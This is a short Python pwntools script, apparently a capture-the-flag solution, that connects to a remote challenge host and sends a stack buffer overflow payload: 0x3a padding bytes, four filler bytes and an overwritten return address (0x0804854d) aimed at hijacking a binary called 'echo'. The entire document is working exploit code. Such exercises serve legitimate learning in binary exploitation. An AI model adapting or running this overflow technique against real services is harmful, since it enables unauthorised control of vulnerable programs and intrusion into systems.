from pwn import *

#sh = process('./echo')

sh = remote('111.198.29.45',32349)

payload = 'a' * 0x3a + 'bbbb' + p32(0x0804854d)

sh.sendline(payload)
print sh.recv()

#sh.interactive()
